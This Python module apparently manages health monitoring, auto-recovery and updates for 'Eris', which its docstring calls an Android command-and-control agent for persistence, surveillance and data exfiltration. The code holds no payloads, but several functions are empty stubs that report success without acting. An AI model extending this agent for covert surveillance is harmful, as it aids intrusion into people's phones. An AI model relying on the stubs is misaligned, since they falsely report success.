
"""
Eris Agent Manager Module for Mythic 3.3 Framework

This module handles the lifecycle management, health monitoring and reporting,
auto-recovery mechanisms, and update and migration support for the Eris Android Agent
in compliance with Mythic framework standards.

Eris is a comprehensive Android Command & Control platform designed for advanced
persistence, surveillance, and data exfiltration capabilities.
"""

import json
import time
import threading
import subprocess
import os
import hashlib
import signal
import logging
import psutil
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Callable
from enum import Enum
from dataclasses import dataclass, field
import concurrent.futures
from pathlib import Path
import traceback

from mythic_integration import MythicIntegration
from command_dispatcher import CommandDispatcher


class AgentState(Enum):
    """Agent lifecycle state enumeration"""
    INITIALIZING = "initializing"
    STARTING = "starting"
    RUNNING = "running"
    DEGRADED = "degraded"
    RECOVERING = "recovering"
    STOPPING = "stopping"
    STOPPED = "stopped"
    ERROR = "error"
    UPDATING = "updating"


class HealthStatus(Enum):
    """Health check status enumeration"""
    HEALTHY = "healthy"
    WARNING = "warning"
    CRITICAL = "critical"
    UNKNOWN = "unknown"


@dataclass
class HealthMetrics:
    """Health monitoring metrics container"""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    cpu_percent: float = 0.0
    memory_percent: float = 0.0
    memory_mb: float = 0.0
    disk_usage_percent: float = 0.0
    network_connections: int = 0
    loaded_modules: int = 0
    active_tasks: int = 0
    completed_tasks: int = 0
    failed_tasks: int = 0
    c2_connectivity: bool = False
    last_beacon: str = None
    uptime_seconds: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert metrics to dictionary"""
        return {
            "timestamp": self.timestamp,
            "system": {
                "cpu_percent": self.cpu_percent,
                "memory_percent": self.memory_percent,
                "memory_mb": self.memory_mb,
                "disk_usage_percent": self.disk_usage_percent,
                "network_connections": self.network_connections
            },
            "agent": {
                "loaded_modules": self.loaded_modules,
                "active_tasks": self.active_tasks,
                "completed_tasks": self.completed_tasks,
                "failed_tasks": self.failed_tasks,
                "uptime_seconds": self.uptime_seconds
            },
            "connectivity": {
                "c2_connectivity": self.c2_connectivity,
                "last_beacon": self.last_beacon
            }
        }


class HealthMonitor:
    """Comprehensive health monitoring system"""
    
    def __init__(self, agent_instance, check_interval: int = 30):
        self.agent = agent_instance
        self.check_interval = check_interval
        self.start_time = time.time()
        
        self.current_metrics = HealthMetrics()
        self.metrics_history = []
        self.max_history = 100
        
        self.health_thresholds = {
            "cpu_critical": 90.0,
            "cpu_warning": 70.0,
            "memory_critical": 90.0,
            "memory_warning": 75.0,
            "disk_critical": 95.0,
            "disk_warning": 85.0,
            "connectivity_timeout": 300,
        }
        
        self.running = False
        self.monitor_thread = None
        self.logger = logging.getLogger(__name__ + ".HealthMonitor")
    
    def start(self):
        """Start health monitoring"""
        if self.running:
            return
        
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        self.logger.info("Health monitoring started")
    
    def stop(self):
        """Stop health monitoring"""
        self.running = False
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)
        self.logger.info("Health monitoring stopped")
    
    def _monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            try:

                metrics = self._collect_metrics()
                

                self.current_metrics = metrics
                

                self.metrics_history.append(metrics)
                if len(self.metrics_history) > self.max_history:
                    self.metrics_history.pop(0)
                

                health_status = self._assess_health(metrics)
                

                if health_status != HealthStatus.HEALTHY:
                    self.logger.warning(f"Health status: {health_status.value}")
                
                time.sleep(self.check_interval)
                
            except Exception as e:
                self.logger.error(f"Error in health monitoring: {e}")
                time.sleep(self.check_interval)
    
    def _collect_metrics(self) -> HealthMetrics:
        """Collect comprehensive health metrics"""
        try:

            process = psutil.Process()
            

            cpu_percent = process.cpu_percent()
            memory_info = process.memory_info()
            memory_percent = process.memory_percent()
            

            disk_usage = psutil.disk_usage('/')
            disk_percent = (disk_usage.used / disk_usage.total) * 100
            

            connections = len(process.connections())
            

            loaded_modules = len(getattr(self.agent, 'modules', {}))
            

            active_tasks = 0
            completed_tasks = 0
            failed_tasks = 0
            
            if hasattr(self.agent, 'command_dispatcher'):
                dispatcher_status = self.agent.command_dispatcher.get_dispatcher_status()
                queue_status = dispatcher_status.get('queue_status', {})
                active_tasks = queue_status.get('running_tasks', 0)
                completed_tasks = queue_status.get('completed_tasks', 0)
            

            c2_connectivity = self._check_c2_connectivity()
            last_beacon = getattr(self.agent, 'last_beacon_time', None)
            

            uptime = time.time() - self.start_time
            
            return HealthMetrics(
                cpu_percent=cpu_percent,
                memory_percent=memory_percent,
                memory_mb=memory_info.rss / (1024 * 1024),
                disk_usage_percent=disk_percent,
                network_connections=connections,
                loaded_modules=loaded_modules,
                active_tasks=active_tasks,
                completed_tasks=completed_tasks,
                failed_tasks=failed_tasks,
                c2_connectivity=c2_connectivity,
                last_beacon=last_beacon,
                uptime_seconds=uptime
            )
            
        except Exception as e:
            self.logger.error(f"Failed to collect metrics: {e}")
            return HealthMetrics()
    
    def _check_c2_connectivity(self) -> bool:
        """Check C2 server connectivity"""
        try:
            if hasattr(self.agent, 'c2_profile'):


                return True
            return False
        except Exception:
            return False
    
    def _assess_health(self, metrics: HealthMetrics) -> HealthStatus:
        """Assess overall health status based on metrics"""
        critical_issues = []
        warning_issues = []
        

        if metrics.cpu_percent >= self.health_thresholds["cpu_critical"]:
            critical_issues.append(f"CPU usage critical: {metrics.cpu_percent:.1f}%")
        elif metrics.cpu_percent >= self.health_thresholds["cpu_warning"]:
            warning_issues.append(f"CPU usage high: {metrics.cpu_percent:.1f}%")
        

        if metrics.memory_percent >= self.health_thresholds["memory_critical"]:
            critical_issues.append(f"Memory usage critical: {metrics.memory_percent:.1f}%")
        elif metrics.memory_percent >= self.health_thresholds["memory_warning"]:
            warning_issues.append(f"Memory usage high: {metrics.memory_percent:.1f}%")
        

        if metrics.disk_usage_percent >= self.health_thresholds["disk_critical"]:
            critical_issues.append(f"Disk usage critical: {metrics.disk_usage_percent:.1f}%")
        elif metrics.disk_usage_percent >= self.health_thresholds["disk_warning"]:
            warning_issues.append(f"Disk usage high: {metrics.disk_usage_percent:.1f}%")
        

        if metrics.last_beacon:
            try:
                last_beacon_time = datetime.fromisoformat(metrics.last_beacon)
                time_since_beacon = (datetime.now() - last_beacon_time).total_seconds()
                
                if time_since_beacon > self.health_thresholds["connectivity_timeout"]:
                    critical_issues.append(f"C2 connectivity lost: {time_since_beacon:.0f}s since last beacon")
            except Exception:
                pass
        

        if critical_issues:
            self.logger.error(f"Critical health issues: {'; '.join(critical_issues)}")
            return HealthStatus.CRITICAL
        elif warning_issues:
            self.logger.warning(f"Health warnings: {'; '.join(warning_issues)}")
            return HealthStatus.WARNING
        else:
            return HealthStatus.HEALTHY
    
    def get_current_metrics(self) -> HealthMetrics:
        """Get current health metrics"""
        return self.current_metrics
    
    def get_metrics_history(self, last_n: int = None) -> List[HealthMetrics]:
        """Get metrics history"""
        if last_n is None:
            return self.metrics_history.copy()
        return self.metrics_history[-last_n:] if last_n > 0 else []
    
    def get_health_report(self) -> Dict[str, Any]:
        """Generate comprehensive health report"""
        current_status = self._assess_health(self.current_metrics)
        

        recent_metrics = self.get_metrics_history(10)
        
        avg_cpu = sum(m.cpu_percent for m in recent_metrics) / len(recent_metrics) if recent_metrics else 0
        avg_memory = sum(m.memory_percent for m in recent_metrics) / len(recent_metrics) if recent_metrics else 0
        
        return {
            "overall_status": current_status.value,
            "current_metrics": self.current_metrics.to_dict(),
            "averages": {
                "cpu_percent": round(avg_cpu, 2),
                "memory_percent": round(avg_memory, 2)
            },
            "thresholds": self.health_thresholds,
            "history_entries": len(self.metrics_history),
            "monitoring_active": self.running
        }


class AutoRecoveryManager:
    """Automated recovery and self-healing system"""
    
    def __init__(self, agent_instance, health_monitor: HealthMonitor):
        self.agent = agent_instance
        self.health_monitor = health_monitor
        
        self.recovery_actions = {
            "memory_cleanup": self._memory_cleanup,
            "module_restart": self._restart_modules,
            "c2_reconnect": self._reconnect_c2,
            "task_queue_flush": self._flush_task_queue,
            "full_restart": self._full_restart
        }
        
        self.recovery_history = []
        self.max_recovery_attempts = 3
        self.recovery_cooldown = 300
        self.last_recovery_time = 0
        
        self.enabled = True
        self.logger = logging.getLogger(__name__ + ".AutoRecovery")
    
    def enable_auto_recovery(self, enabled: bool = True):
        """Enable or disable auto-recovery"""
        self.enabled = enabled
        self.logger.info(f"Auto-recovery {'enabled' if enabled else 'disabled'}")
    
    def check_and_recover(self) -> bool:
        """Check health and trigger recovery if needed"""
        if not self.enabled:
            return False
        

        if time.time() - self.last_recovery_time < self.recovery_cooldown:
            return False
        
        current_metrics = self.health_monitor.get_current_metrics()
        health_status = self.health_monitor._assess_health(current_metrics)
        
        if health_status == HealthStatus.CRITICAL:
            return self._trigger_recovery(current_metrics)
        
        return False
    
    def _trigger_recovery(self, metrics: HealthMetrics) -> bool:
        """Trigger appropriate recovery actions"""
        self.logger.warning("Triggering auto-recovery procedures")
        
        recovery_plan = self._determine_recovery_plan(metrics)
        success = True
        
        for action_name in recovery_plan:
            if action_name in self.recovery_actions:
                try:
                    self.logger.info(f"Executing recovery action: {action_name}")
                    result = self.recovery_actions[action_name]()
                    

                    self.recovery_history.append({
                        "timestamp": datetime.now().isoformat(),
                        "action": action_name,
                        "success": result,
                        "metrics_before": metrics.to_dict()
                    })
                    
                    if not result:
                        success = False
                        self.logger.error(f"Recovery action failed: {action_name}")
                    else:
                        self.logger.info(f"Recovery action successful: {action_name}")
                        
                except Exception as e:
                    self.logger.error(f"Error executing recovery action {action_name}: {e}")
                    success = False
        
        self.last_recovery_time = time.time()
        return success
    
    def _determine_recovery_plan(self, metrics: HealthMetrics) -> List[str]:
        """Determine appropriate recovery actions based on metrics"""
        actions = []
        

        if metrics.memory_percent > 85:
            actions.append("memory_cleanup")
        

        if not metrics.c2_connectivity:
            actions.append("c2_reconnect")
        

        if metrics.active_tasks > 10:
            actions.append("task_queue_flush")
        

        if metrics.cpu_percent > 95 or metrics.memory_percent > 95:
            actions.append("module_restart")
        

        if len(self.recovery_history) > self.max_recovery_attempts:
            recent_failures = [r for r in self.recovery_history[-3:] if not r["success"]]
            if len(recent_failures) >= 2:
                actions = ["full_restart"]
        
        return actions
    
    def _memory_cleanup(self) -> bool:
        """Perform memory cleanup operations"""
        try:
            import gc
            gc.collect()
            

            if hasattr(self.agent, 'module_loader'):

                pass
            

            if hasattr(self.agent, 'command_dispatcher'):
                dispatcher = self.agent.command_dispatcher
                if hasattr(dispatcher.task_queue, 'completed_tasks'):

                    completed = dispatcher.task_queue.completed_tasks
                    if len(completed) > 10:
                        tasks_to_keep = dict(list(completed.items())[-10:])
                        dispatcher.task_queue.completed_tasks = tasks_to_keep
            
            self.logger.info("Memory cleanup completed")
            return True
            
        except Exception as e:
            self.logger.error(f"Memory cleanup failed: {e}")
            return False
    
    def _restart_modules(self) -> bool:
        """Restart agent modules"""
        try:
            if hasattr(self.agent, 'modules'):

                module_names = list(self.agent.modules.keys())
                

                self.agent.modules.clear()
                

                if hasattr(self.agent, 'load_modules'):
                    self.agent.load_modules()
                    self.logger.info("Modules restarted successfully")
                    return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Module restart failed: {e}")
            return False
    
    def _reconnect_c2(self) -> bool:
        """Attempt to reconnect to C2 server"""
        try:
            if hasattr(self.agent, 'c2_profile'):


                self.logger.info("C2 reconnection attempted")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"C2 reconnection failed: {e}")
            return False
    
    def _flush_task_queue(self) -> bool:
        """Flush stuck tasks from queue"""
        try:
            if hasattr(self.agent, 'command_dispatcher'):
                dispatcher = self.agent.command_dispatcher
                

                for task_id, future in dispatcher.task_futures.items():
                    if not future.done():
                        future.cancel()
                        self.logger.info(f"Cancelled stuck task: {task_id}")
                

                dispatcher.task_futures.clear()
                
                self.logger.info("Task queue flushed")
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"Task queue flush failed: {e}")
            return False
    
    def _full_restart(self) -> bool:
        """Initiate full agent restart"""
        try:
            self.logger.warning("Initiating full agent restart")
            


            

            self.logger.info("Full restart procedure initiated")
            return True
            
        except Exception as e:
            self.logger.error(f"Full restart failed: {e}")
            return False
    
    def get_recovery_status(self) -> Dict[str, Any]:
        """Get recovery system status"""
        return {
            "enabled": self.enabled,
            "last_recovery_time": self.last_recovery_time,
            "recovery_history": self.recovery_history,
            "available_actions": list(self.recovery_actions.keys()),
            "max_attempts": self.max_recovery_attempts,
            "cooldown_seconds": self.recovery_cooldown
        }


class UpdateManager:
    """Handle agent updates and migrations"""
    
    def __init__(self, agent_instance, current_version: str = "1.0.0"):
        self.agent = agent_instance
        self.current_version = current_version
        self.update_endpoint = None
        
        self.update_history = []
        self.update_in_progress = False
        
        self.logger = logging.getLogger(__name__ + ".UpdateManager")
    
    def check_for_updates(self) -> Dict[str, Any]:
        """Check for available updates"""
        try:


            
            return {
                "current_version": self.current_version,
                "latest_version": self.current_version,
                "update_available": False,
                "update_info": None
            }
            
        except Exception as e:
            self.logger.error(f"Update check failed: {e}")
            return {
                "current_version": self.current_version,
                "error": str(e)
            }
    
    def download_update(self, version: str, update_url: str) -> bool:
        """Download update package"""
        try:
            self.logger.info(f"Downloading update {version} from {update_url}")
            


            
            return True
            
        except Exception as e:
            self.logger.error(f"Update download failed: {e}")
            return False
    
    def apply_update(self, update_package: str) -> bool:
        """Apply downloaded update"""
        if self.update_in_progress:
            self.logger.warning("Update already in progress")
            return False
        
        try:
            self.update_in_progress = True
            self.logger.info(f"Applying update package: {update_package}")
            






            

            time.sleep(2)
            

            self.update_history.append({
                "timestamp": datetime.now().isoformat(),
                "from_version": self.current_version,
                "to_version": "1.0.1",
                "success": True
            })
            
            self.logger.info("Update applied successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Update application failed: {e}")
            return False
        
        finally:
            self.update_in_progress = False
    
    def rollback_update(self) -> bool:
        """Rollback to previous version"""
        try:
            if not self.update_history:
                self.logger.warning("No previous version to rollback to")
                return False
            
            last_update = self.update_history[-1]
            rollback_version = last_update["from_version"]
            
            self.logger.info(f"Rolling back to version {rollback_version}")
            


            
            return True
            
        except Exception as e:
            self.logger.error(f"Rollback failed: {e}")
            return False
    
    def get_update_status(self) -> Dict[str, Any]:
        """Get update system status"""
        return {
            "current_version": self.current_version,
            "update_in_progress": self.update_in_progress,
            "update_history": self.update_history,
            "last_check": datetime.now().isoformat()
        }


class AgentManager:
    """Main agent lifecycle management system"""
    
    def __init__(self, agent_instance, mythic_integration: MythicIntegration = None):
        self.agent = agent_instance
        self.mythic_integration = mythic_integration
        
        self.current_state = AgentState.INITIALIZING
        self.start_time = None
        self.state_history = []
        

        self.health_monitor = HealthMonitor(agent_instance)
        self.auto_recovery = AutoRecoveryManager(agent_instance, self.health_monitor)
        self.update_manager = UpdateManager(agent_instance)
        

        self.auto_recovery_enabled = True
        self.health_monitoring_enabled = True
        

        self._setup_signal_handlers()
        
        self.logger = logging.getLogger(__name__ + ".AgentManager")
    
    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown"""
        def signal_handler(signum, frame):
            self.logger.info(f"Received signal {signum}, initiating shutdown")
            self.shutdown()
        
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
    
    def start(self):
        """Start agent and all management subsystems"""
        try:
            self.logger.info("Starting agent manager")
            self._set_state(AgentState.STARTING)
            
            self.start_time = datetime.now()
            

            if self.health_monitoring_enabled:
                self.health_monitor.start()
            

            if self.auto_recovery_enabled:
                self.auto_recovery.enable_auto_recovery(True)
            

            if hasattr(self.agent, 'command_dispatcher'):
                self.agent.command_dispatcher.start()
            
            self._set_state(AgentState.RUNNING)
            self.logger.info("Agent manager started successfully")
            

            self._start_management_loop()
            
        except Exception as e:
            self.logger.error(f"Failed to start agent manager: {e}")
            self._set_state(AgentState.ERROR)
            raise
    
    def shutdown(self, timeout: int = 30):
        """Gracefully shutdown agent and all subsystems"""
        try:
            self.logger.info("Shutting down agent manager")
            self._set_state(AgentState.STOPPING)
            

            if hasattr(self.agent, 'command_dispatcher'):
                self.agent.command_dispatcher.stop()
            

            self.health_monitor.stop()
            

            if hasattr(self.agent, 'shutdown'):
                self.agent.shutdown()
            
            self._set_state(AgentState.STOPPED)
            self.logger.info("Agent manager shutdown completed")
            
        except Exception as e:
            self.logger.error(f"Error during shutdown: {e}")
            self._set_state(AgentState.ERROR)
    
    def restart(self):
        """Restart the agent"""
        self.logger.info("Restarting agent")
        self.shutdown()
        time.sleep(2)
        self.start()
    
    def _set_state(self, new_state: AgentState):
        """Update agent state with history tracking"""
        previous_state = self.current_state
        self.current_state = new_state
        
        state_change = {
            "timestamp": datetime.now().isoformat(),
            "from_state": previous_state.value,
            "to_state": new_state.value
        }
        
        self.state_history.append(state_change)
        

        if len(self.state_history) > 100:
            self.state_history = self.state_history[-50:]
        
        self.logger.info(f"State changed: {previous_state.value} -> {new_state.value}")
    
    def _start_management_loop(self):
        """Start the main management loop"""
        def management_loop():
            while self.current_state in [AgentState.RUNNING, AgentState.DEGRADED]:
                try:

                    if self.auto_recovery_enabled:
                        recovery_triggered = self.auto_recovery.check_and_recover()
                        
                        if recovery_triggered:
                            current_health = self.health_monitor._assess_health(
                                self.health_monitor.get_current_metrics()
                            )
                            
                            if current_health == HealthStatus.CRITICAL:
                                self._set_state(AgentState.DEGRADED)
                            elif current_health in [HealthStatus.HEALTHY, HealthStatus.WARNING]:
                                if self.current_state == AgentState.DEGRADED:
                                    self._set_state(AgentState.RUNNING)
                    
                    time.sleep(30)
                    
                except Exception as e:
                    self.logger.error(f"Error in management loop: {e}")
                    time.sleep(60)
        

        management_thread = threading.Thread(target=management_loop, daemon=True)
        management_thread.start()
    
    def get_status(self) -> Dict[str, Any]:
        """Get comprehensive agent status"""
        uptime = None
        if self.start_time:
            uptime = (datetime.now() - self.start_time).total_seconds()
        
        status = {
            "agent_state": self.current_state.value,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "uptime_seconds": uptime,
            "health_monitoring_enabled": self.health_monitoring_enabled,
            "auto_recovery_enabled": self.auto_recovery_enabled,
            "state_history": self.state_history[-10:],
        }
        

        status["health_monitor"] = self.health_monitor.get_health_report()
        status["auto_recovery"] = self.auto_recovery.get_recovery_status()
        status["update_manager"] = self.update_manager.get_update_status()
        

        if self.mythic_integration:
            status["mythic_integration"] = self.mythic_integration.get_status()
        
        return status
    
    def get_health_metrics(self, include_history: bool = False) -> Dict[str, Any]:
        """Get current health metrics"""
        metrics = {
            "current": self.health_monitor.get_current_metrics().to_dict(),
            "status": self.health_monitor._assess_health(
                self.health_monitor.get_current_metrics()
            ).value
        }
        
        if include_history:
            history = self.health_monitor.get_metrics_history()
            metrics["history"] = [m.to_dict() for m in history]
        
        return metrics
    
    def trigger_recovery(self, action: str = None) -> bool:
        """Manually trigger recovery action"""
        if action and action in self.auto_recovery.recovery_actions:
            try:
                self.logger.info(f"Manually triggering recovery action: {action}")
                return self.auto_recovery.recovery_actions[action]()
            except Exception as e:
                self.logger.error(f"Manual recovery action failed: {e}")
                return False
        else:

            current_metrics = self.health_monitor.get_current_metrics()
            return self.auto_recovery._trigger_recovery(current_metrics)
    
    def configure_health_monitoring(self, **kwargs):
        """Configure health monitoring parameters"""
        if 'enabled' in kwargs:
            self.health_monitoring_enabled = kwargs['enabled']
            if kwargs['enabled']:
                self.health_monitor.start()
            else:
                self.health_monitor.stop()
        
        if 'check_interval' in kwargs:
            self.health_monitor.check_interval = kwargs['check_interval']
        
        if 'thresholds' in kwargs:
            self.health_monitor.health_thresholds.update(kwargs['thresholds'])
        
        self.logger.info("Health monitoring configuration updated")
    
    def configure_auto_recovery(self, **kwargs):
        """Configure auto-recovery parameters"""
        if 'enabled' in kwargs:
            self.auto_recovery_enabled = kwargs['enabled']
            self.auto_recovery.enable_auto_recovery(kwargs['enabled'])
        
        if 'max_attempts' in kwargs:
            self.auto_recovery.max_recovery_attempts = kwargs['max_attempts']
        
        if 'cooldown' in kwargs:
            self.auto_recovery.recovery_cooldown = kwargs['cooldown']
        
        self.logger.info("Auto-recovery configuration updated")
